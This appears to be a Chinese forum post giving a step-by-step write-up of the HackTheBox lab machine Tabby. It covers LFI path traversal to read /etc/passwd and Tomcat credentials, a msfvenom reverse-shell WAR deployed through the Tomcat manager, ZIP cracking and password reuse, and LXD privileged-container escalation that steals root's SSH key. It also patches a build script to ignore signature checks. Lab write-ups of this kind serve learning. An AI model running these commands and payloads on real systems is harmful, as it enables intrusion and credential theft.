---
title: "历时五小时，拿下HTB Tabby靶机，附详细渗透测试记录"
source: "https://linux.do/t/topic/542542"
author:
  - "[[user792]]"
published: 2026-05-09
created: 2026-05-09
---
[![[2f5ede9fb06b3f43dfe741ae1ab7ab0e_MD5.jpg]]

image697×657 97.7 KB

](https://cdn3.ldstatic.com/original/4X/3/c/9/3c9156c046a6caf3007d7fbe16bfa1abc265d8b4.jpeg "image")

其实今天想摆烂的，终于在十一点五十九分的时候决定还是别摆烂了，虽然天快亮了，但是还是完成了，这个靶机的提权难度不低的

纸上得来终觉浅，绝知此事要躬行~  
看别人的攻击记录和自己打一遍完全是两码事，共勉

以下是详细攻击记录

# HTB Tabby渗透测试详细记录

## 摘要 

本文记录了对Tabby的渗透测试全过程。通过端口扫描发现开放的服务，利用文件包含漏洞读取敏感信息，获取Tomcat管理员凭据，部署恶意WAR文件获取初始shell，利用密码重用提升至普通用户权限，最终通过LXD容器特权提升至root权限。

## 关键技术

- 端口扫描与服务识别
- 本地文件包含（LFI）漏洞
- Tomcat Manager部署恶意WAR文件
- 密码重用攻击
- 密码破解技术
- LXD特权容器提权

## 1\. 初始侦察阶段

首先进行全端口扫描，快速识别目标机器的开放端口：

```bash
nmap -sT -min-rate 10000 -p- 10.10.10.194
```

参数说明：

- `-sT`：使用TCP连接扫描，建立完整的三次握手
- `-min-rate 10000`：设置最小发包速率，加快扫描速度
- `-p-`：扫描所有65535个端口
- `10.10.10.194`：目标IP地址

扫描结果显示三个开放端口：

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

## 2\. 服务探测与信息收集

对开放端口进行详细的服务版本识别和基本脚本扫描：

```bash
nmap -sT -sC -sV -O -p22,80,8080 10.10.10.194
```

参数说明：

- `-sC`：使用默认脚本集进行扫描
- `-sV`：探测服务版本信息
- `-O`：尝试识别操作系统信息

详细扫描结果：

```ruby
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
OS details: Linux 4.15 - 5.19
```

通过初步访问网站，我们发现多个链接指向`megahosting.htb`域名，尤其是一个有趣的链接：

```bash
http://megahosting.htb/news.php?file=statement
```

将域名添加到本地hosts文件：

```bash
echo '10.10.10.194 megahosting.htb' >> "/etc/hosts"
```

## 3\. 漏洞识别与初始访问

### 3.1 文件包含漏洞（LFI）

访问主页[http://megahosting.htb/](http://megahosting.htb/) 我注意到一个特殊的参数，[http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement) ，这个参数可能存在文件包含漏洞\*\*?file=statement\*\*，实在是过于明显了，尝试读取/etc/password

```bash
http://megahosting.htb/news.php?file=../../../../etc/passwd
```

返回值如下，成功利用了文件包含漏洞，获取到了`/etc/passwd`文件内容，确认存在本地文件包含漏洞。从文件内容中发现了用户`ash`和`tomcat`。

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash
```

### 3.2 利用LFI获取Tomcat凭据

注意到目标存在Apache Tomcat服务（端口8080），尝试获取Tomcat的认证凭据。访问[http://10.10.10.194:8080/manager/](http://10.10.10.194:8080/manager/) ，尝试常见的弱口令失败，但是取消登陆之后，返回401错误页面，分析错误页面可知，登陆凭证存储在conf/tomcat-users.xml中

根据Tomcat9的标准安装目录，Tomcat用户凭据通常储存在：

```bash
/usr/share/tomcat9/etc/tomcat-users.xml
```

再利用之前的文件包含漏洞，就可以读取到Tomcat的用户名和密码,利用LFI读取该文件：

```bash
http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

成功获取Tomcat管理员凭据：

```xml
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

### 3.3 利用Tomcat接口上传恶意WAR

尝试使用凭据登录图形管理界面`http://10.10.10.194:8080/manager/`，但返回403错误。提示没有权限查看此界面，默认情况下，管理员只能从与 Tomcat 在同一台机器上运行的浏览器访问。如果您想修改此限制，您需要编辑管理器的 context.xml 文件。

继续探索管理接口，对tomcat进行目录遍历、fuzz，尝试寻找新的线索

```swift
feroxbuster -u http://10.10.10.194:8080
wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://10.10.10.194:8080/manager/FUZZ
```

找到接口：

```ruby
http://10.10.10.194:8080/manager/text/
```

根据官方文档，我可以利用之前获取的凭据，在这个接口，执行命令，尝试上传木马获取shell了

步骤如下：

1. 使用msfvenom生成恶意WAR文件：
```bash
msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.16 LPORT=9999 -f war -o exp.war
```

参数说明：

- `-p java/shell_reverse_tcp`：使用Java反向TCP连接载荷
- `LHOST=10.10.16.16`：指定接收反弹shell的IP地址
- `LPORT=9999`：指定监听端口
- `-f war`：生成WAR文件格式
- `-o exp.war`：指定输出文件名
1. 设置监听器接收反弹shell：
	1. 启动msf控制台
		```undefined
		msfconsole
		```
		2. 设置监听器
		```bash
		use multi/handler
		```
		3. 设置攻击载荷类型，注意要和之前的相同
		```bash
		set payload java/shell_reverse_tcp
		```
		4. 设置本地主机ip和端口
		```bash
		set lhost 10.10.16.16
		set lport 9999
		```
		5. 验证设置
		```yaml
		show options
		Payload options (java/shell_reverse_tcp):
		   Name   Current Setting  Required  Description
		   ----   ---------------  --------  -----------
		   LHOST  10.10.16.16      yes       The listen address (an interface may be specified)
		   LPORT  9999             yes       The listen port
		```
		6. 建立监听
		```csharp
		run
		[*] Started reverse TCP handler on 10.10.16.16:9999
		```
2. 上传WAR文件到Tomcat：
```bash
curl -v -u tomcat:'$3cureP4s5w0rd123!' --upload-file exp.war "http://megahosting.htb:8080/manager/text/deploy?path=/exp&update=true"
```

参数说明：

- `-v`：显示详细信息
- `-u tomcat:'$3cureP4s5w0rd123!'`：提供HTTP基本认证的用户名和密码
- `--upload-file exp.war`：指定要上传的WAR文件
- `path=/exp`：指定部署路径
- `update=true`：如果已存在则更新
3. 触发WAR包反弹shell：
```bash
curl http://10.10.10.194:8080/exp
```

成功接收到反弹shell，以tomcat用户身份获得系统访问权限：

```bash
[*] Started reverse TCP handler on 10.10.16.16:9999 
[*] Command shell session 1 opened (10.10.16.16:9999 -> 10.10.10.194:51966) at 2025-04-09 02:19:30 +0800

id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

获取交互式shell：

```bash
which python pyhton2 python3
/usr/bin/python3
/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## 4\. 横向移动

进行主机信息收集：

```bash
hostname
whoami
uname -a
```

系统信息：

```graphql
Linux tabby 5.4.0-31-generic #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

发现用户目录：

```bash
cd /home
ls -al
```

结果显示存在一个用户`ash`。

### 发现备份文件

搜索网站目录，在`/var/www/html/files`发现一个备份文件：

```python
16162020_backup.zip
```

下载备份文件进行分析：

```bash
http://megahosting.htb/files/16162020_backup.zip
```

### 破解ZIP密码

使用fcrackzip破解zip密码：

```bash
apt install fcrackzip
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
```

参数说明：

- `-v`：显示详细信息
- `-u`：尝试解密（而不仅是测试）
- `-D`：使用字典攻击
- `-p`：指定密码字典文件

成功破解密码：`admin@it`

密码为admin@it，尝试密码碰撞，可能是ash账户的密码

### 凭据复用获取ash用户权限

尝试使用该密码进行用户切换，成功提升为ash用户：

```bash
su ash
Password: admin@it
whoami
```

成功获取用户标志：

```bash
cat /home/ash/user.txt
52c53da10d2c87d7d4ab92bb2ac610fd
```

## 5\. 权限提升前的信息收集

检查ash用户的组成员关系：

```bash
id
```

结果显示：

```ini
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

注意到ash用户属于`lxd`组，这是一个特权组，类似于Docker组，成员可以操作LXD容器，这为权限提升提供了可能性。

## 6\. 权限提升

**提权思路如下**  
利用ash用户属于lxd组的特权。LXD组成员可以在不使用sudo的情况下创建和管理容器，而容器本身运行在root权限下。通过导入一个自定义的Alpine镜像，创建一个特权模式的容器，并将主机的根目录(/）完整挂载到容器内的/mnt/root路径，就可以在容器内以root身份访问并操作主机的整个文件系统。这样就可以读取root用户的SSH私钥或任何其他敏感文件，从而实现完全的权限提升。

利用LXD组成员权限进行提权，步骤如下：

1. 在本地构建Alpine镜像：
```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
sudo ./build-alpine
(构建的时候一直报错，脚本无法验证 sha256.alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub 的校验和)
解决方法如下
```

编辑器打开build-alpine

找到这段代码

```bash
keyname=$(echo $rootfs/sbin/apk.static.*.pub | sed 's/.*\.SIGN\.RSA\.//')
checksum=$(echo "$key_sha256sums" |  grep -w "$keyname")
if [ -z "$checksum" ]; then
    echo "ERROR: checksum is missing for $keyname"
    return 1
fi
(cd $rootfs/etc/apk/keys && echo "$checksum" | sha256sum -c -) || return 1
```

将这段代码修改为

```bash
keyname=$(echo $rootfs/sbin/apk.static.*.pub | sed 's/.*\.SIGN\.RSA\.//')
echo "Keyname found: $keyname"

# 将密钥添加到文件系统
mkdir -p $rootfs/etc/apk/keys
if [ ! -f "$rootfs/etc/apk/keys/$keyname" ]; then
    echo "Creating empty key file"
    touch "$rootfs/etc/apk/keys/$keyname"
fi

checksum=$(echo "$key_sha256sums" |  grep -w "$keyname")
if [ -z "$checksum" ]; then
    echo "WARNING: checksum is missing for $keyname, but continuing anyway"
    # 不返回错误，继续执行
else
    echo "Found checksum for $keyname: $checksum"
    # 尝试验证，但即使失败也继续
    (cd $rootfs/etc/apk/keys && echo "$checksum" | sha256sum -c -) || echo "Checksum verification failed, but continuing"
fi
```

找到这段代码

```bash
openssl dgst -sha1 -verify $rootfs/etc/apk/keys/$keyname \
    -signature "$APK.SIGN.RSA.$keyname" "$APK" || return 1
```

将其替换为：

```bash
echo "Attempting to verify signature (might fail but we'll continue)"
openssl dgst -sha1 -verify $rootfs/etc/apk/keys/$keyname \
    -signature "$APK.SIGN.RSA.$keyname" "$APK" || echo "Signature verification failed, but continuing anyway"
```

替换完成以上两段代码，保存文件，重新构建（其实也可以用仓库中自带的alpine-v3.13-x86\_64-20210218\_0139.tar.gz）

```bash
sudo ./build-alpine
```
- 在本地启动HTTP服务以便目标机器下载镜像：
```bash
python -m http.server
```
- 在目标机器下载镜像：
```bash
cd /home/ash
wget http://10.10.16.16:8000/alpine-v3.21-x86_64-20250409_0339.tar.gz
```
- 初始化LXD（如果尚未初始化，一路回车即可）：
```bash
/snap/bin/lxc init
```
- 导入Alpine镜像：
```bash
/snap/bin/lxc image import ./alpine-v3.21-x86_64-20250409_0339.tar.gz --alias alpine
```
- 检查镜像是否导入成功：
```bash
/snap/bin/lxc image list
```
- 创建特权容器并挂载主机文件系统：
```bash
/snap/bin/lxc init alpine mycontainer -c security.privileged=true
/snap/bin/lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

参数说明：

- `security.privileged=true`：以特权模式运行容器
- `source=/`：挂载源（主机根目录）
- `path=/mnt/root`：挂载点（容器内的路径）
- `recursive=true`：递归挂载所有子目录
1. 启动容器并执行shell：
```bash
/snap/bin/lxc start mycontainer
/snap/bin/lxc exec mycontainer /bin/sh
```
1. 在容器内访问主机文件系统，获取root私钥：
```bash
cat /mnt/root/root/.ssh/id_rsa
```
1. 将私钥保存到本地并设置权限：
```bash
chmod 400 key
```
1. 使用SSH私钥登录root账户：
```bash
ssh -i key root@10.10.10.194
```

成功获取root标志：

```bash
cat /root/root.txt
36c8577e4778dfc53402f5552d12ce1e
```

## 7\. 总结与安全建议

### 安全漏洞列表

1. **本地文件包含（LFI）漏洞**
	- 严重级别：高
		- 位置：`/news.php?file=`参数
2. **敏感凭据暴露**
	- 严重级别：高
		- 位置：`/usr/share/tomcat9/etc/tomcat-users.xml`
3. **弱密码/密码重用**
	- 严重级别：中
		- 描述：ZIP文件密码与用户账户密码相同
4. **LXD权限配置不当**
	- 严重级别：高
		- 描述：普通用户被添加到lxd组

### 风险等级评估

整体风险评级：**高**

由于存在多个高危漏洞，且漏洞组合可以实现从未授权访问到完全系统接管的攻击链，该系统存在严重的安全风险。

### 详细修复建议

1. **修复LFI漏洞**
	- 实施严格的输入验证和路径规范化
		- 使用白名单限制可访问的文件
		- 实现安全的文件包含机制，例如使用预定义的路径映射
2. **改进凭据管理**
	- 将Tomcat用户文件移动到非标准位置
		- 实施更复杂的密码策略
		- 定期轮换密码
3. **解决密码重用问题**
	- 为每个系统和服务使用唯一密码
		- 实施密码管理解决方案
		- 定期进行密码审计
4. **修复LXD权限问题**
	- 从普通用户组中移除lxd组成员资格
		- 仅授予必要用户lxd访问权限
		- 考虑使用AppArmor或SELinux限制容器权限

### 预防类似问题的安全策略

1. **实施安全编码实践**
	- 为开发团队提供安全编码培训
		- 在发布前进行代码审查和安全测试
		- 使用SAST/DAST工具进行自动化安全测试
2. **加强认证与授权机制**
	- 实施多因素认证
		- 遵循最小权限原则
		- 定期审查用户访问权限
3. **改进安全配置管理**
	- 为所有系统创建安全基线配置
		- 定期进行配置审计
		- 使用配置管理工具确保系统符合安全标准
4. **建立漏洞管理流程**
	- 定期进行漏洞扫描和渗透测试
		- 建立漏洞响应和修复流程
		- 跟踪和优先处理安全漏洞

## 8\. 漏洞利用路径总结

### 完整攻击链路图

```swift
端口扫描
↓
发现HTTP/Tomcat服务
↓
利用LFI漏洞读取/etc/passwd
↓
利用LFI漏洞读取tomcat-users.xml获取凭据
↓
通过Tomcat管理接口部署恶意WAR文件
↓
获取tomcat用户shell
↓
发现并下载备份文件16162020_backup.zip
↓
破解ZIP密码：admin@it
↓
使用相同密码切换到ash用户
↓
发现ash用户属于lxd组
↓
利用LXD特权容器挂载主机文件系统
↓
获取root SSH私钥
↓
使用SSH私钥获取root访问权限
```

### 各阶段关键点总结

1. **初始侦察**
	- 发现开放的HTTP和Tomcat服务
		- 识别潜在网站域名
2. **初始访问**
	- 利用文件包含漏洞读取敏感文件
		- 获取Tomcat管理员凭据
		- 部署恶意WAR文件获取shell
3. **横向移动**
	- 发现备份ZIP文件
		- 破解ZIP密码并尝试密码重用
		- 成功切换到普通用户账户
4. **权限提升**
	- 利用LXD组成员权限创建特权容器
		- 通过挂载主机文件系统获取root访问权限

### 攻击向量简明展示

- **技术路径**：LFI → 凭据泄露 → WAR部署 → 密码复用 → LXD权限提升
- **凭据路径**：Tomcat管理员(tomcat:$3cureP4s5w0rd123!) → 普通用户(ash:admin@it) → root
- **漏洞链**：文件包含 → 未授权访问 → 代码执行 → 弱密码 → 权限配置错误